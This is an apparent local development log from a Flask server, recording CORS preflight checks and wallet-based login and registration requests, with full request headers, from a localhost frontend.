2025-07-05 13:28:14,202 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:28:14] "[33mOPTIONS /analysis/status/2 HTTP/1.1[0m" 404 -
2025-07-05 13:28:14,204 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:28:14] "[33mOPTIONS /analysis/status/1 HTTP/1.1[0m" 404 -
2025-07-05 13:28:14,562 - flask_cors.extension - DEBUG - Request to ''/analysis/status/3'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:28:14,579 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:28:14,582 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:28:14,586 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:28:14,589 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:28:14,592 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:28:14] "[33mOPTIONS /analysis/status/3 HTTP/1.1[0m" 404 -
2025-07-05 17:04:11,210 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:04:11,224 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:04:11,239 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:04:11,248 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 17:04:11,257 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:04:11] "OPTIONS /login HTTP/1.1" 200 -
2025-07-05 17:04:11,271 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 17:04:11,275 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4460', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4460/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 17:04:11,279 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:04:11,281 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:04:11,287 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:04:11,786 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:04:11,790 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:04:11,792 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:04:11,793 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:04:11,795 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:04:11,797 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:04:11] "POST /login HTTP/1.1" 200 -
2025-07-05 17:04:53,327 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:04:53,341 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:04:53,344 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:04:53,347 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 17:04:53,356 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:04:53] "OPTIONS /register HTTP/1.1" 200 -
2025-07-05 17:04:53,368 - app.api.auth - INFO - Received register request with method: POST
2025-07-05 17:04:53,371 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4460', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4460/', 'Content-Length': '138', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 17:04:53,375 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:04:53,376 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:04:53,379 - app.api.auth - INFO - Attempting to register user with wallet: 0xdac17f958d2ee523a2206206994597c13d831ec7
2025-07-05 17:04:53,829 - app.api.auth - INFO - Registration successful for wallet: 0xdac17f958d2ee523a2206206994597c13d831ec7
2025-07-05 17:04:53,831 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:04:53,833 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:04:53,835 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:04:53,837 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:04:53,839 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:04:53] "POST /register HTTP/1.1" 200 -
2025-07-05 17:43:28,472 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:43:28,483 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:43:28,488 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:43:28,496 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 17:43:28,505 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:43:28] "OPTIONS /login HTTP/1.1" 200 -
2025-07-05 17:43:28,525 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 17:43:28,530 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4460', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4460/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 17:43:28,532 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:43:28,534 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:43:28,538 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:43:28,983 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:43:28,987 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:43:28,990 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:43:28,991 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:43:28,993 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:43:28,995 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:43:28] "POST /login HTTP/1.1" 200 -
2025-07-05 17:44:29,511 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:44:29,521 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:44:29,525 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:44:29,530 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 17:44:29,535 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:44:29] "OPTIONS /login HTTP/1.1" 200 -
2025-07-05 17:44:29,548 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 17:44:29,550 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3NDEwMDh9.gggFPNyxlCOleh7a0xBFxJSDlC9BHlfl8IaT3SP-K8w', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4460', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4460/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 17:44:29,552 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:44:29,553 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:44:29,556 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:44:29,977 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:44:29,980 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:44:29,983 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:44:29,985 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:44:29,986 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:44:29,989 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:44:29] "POST /login HTTP/1.1" 200 -
2025-07-05 17:45:39,285 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 17:45:39,323 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4460', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4460/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 17:45:39,340 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:45:39,346 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:45:39,355 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:45:39,845 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:45:39,848 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:45:39,850 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:45:39,852 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:45:39,854 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:45:39,857 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:45:39] "POST /login HTTP/1.1" 200 -
2025-07-05 17:45:46,206 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 17:45:46,214 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4460', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4460/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 17:45:46,218 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:45:46,221 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:45:46,224 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:45:46,710 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:45:46,713 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:45:46,715 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:45:46,717 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:45:46,719 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 17:45:46,721 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:45:46] "POST /login HTTP/1.1" 200 -
2025-07-05 17:46:07,767 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 17:46:07,777 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4460
2025-07-05 17:46:07,781 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 17:46:07,786 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4460'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 17:46:07,790 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 17:46:07] "OPTIONS /login HTTP/1.1" 200 -
2025-07-05 17:46:07,801 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 17:46:07,804 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Connection': 'keep-alive', 'Content-Length': '79', 'Sec-Ch-Ua-Platform': '"macOS"', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"', 'Content-Type': 'application/json', 'Sec-Ch-Ua-Mobile': '?0', 'Origin': 'http://localhost:4460', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'http://localhost:4460/', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-05 17:46:07,805 - app.api.auth - INFO - Request content type: application/json
2025-07-05 17:46:07,807 - app.api.auth - INFO - Processing JSON request
2025-07-05 17:46:07,809 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 17:46:08,230 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
